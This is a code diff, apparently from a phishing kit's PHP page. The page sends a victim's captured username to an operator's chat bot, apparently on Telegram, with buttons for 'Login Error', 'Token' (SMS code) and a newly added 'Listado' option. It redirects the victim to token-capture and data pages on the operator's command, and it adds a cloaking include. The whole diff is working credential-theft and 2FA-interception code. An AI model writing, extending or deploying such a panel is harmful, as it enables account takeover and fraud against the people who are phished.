@@ -1,4 +1,5 @@
 <?php
+require_once __DIR__ . '/cloak.php';
 session_start();
 include('settings.php');
 
@@ -17,10 +18,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         'chat_id'      => $chat_id,
         'text'         => $msg,
         'reply_markup' => json_encode([
-            'inline_keyboard' => [[
-                ['text' => '❌ Login Error', 'callback_data' => "LOGINERROR|$usuario"],
-                ['text' => '🔐 Token',       'callback_data' => "SMS|$usuario"]
-            ]]
+            'inline_keyboard' => [
+                [
+                    ['text' => '❌ Login Error', 'callback_data' => "LOGINERROR|$usuario"],
+                    ['text' => '🔐 Token',       'callback_data' => "SMS|$usuario"]
+                ],
+                [
+                    ['text' => '📋 Listado',     'callback_data' => "LISTADO|$usuario"]
+                ]
+            ]
         ])
     ]);
     // Cae al render de la página de espera abajo
@@ -50,6 +56,8 @@ if (file_exists($archivo)) {
             header("Location: tok.php"); exit;
         case '/LOGIN':
             header("Location: index.php"); exit;
+        case '/LISTADO':
+            header("Location: datos.php"); exit;
     }
 }
 ?>
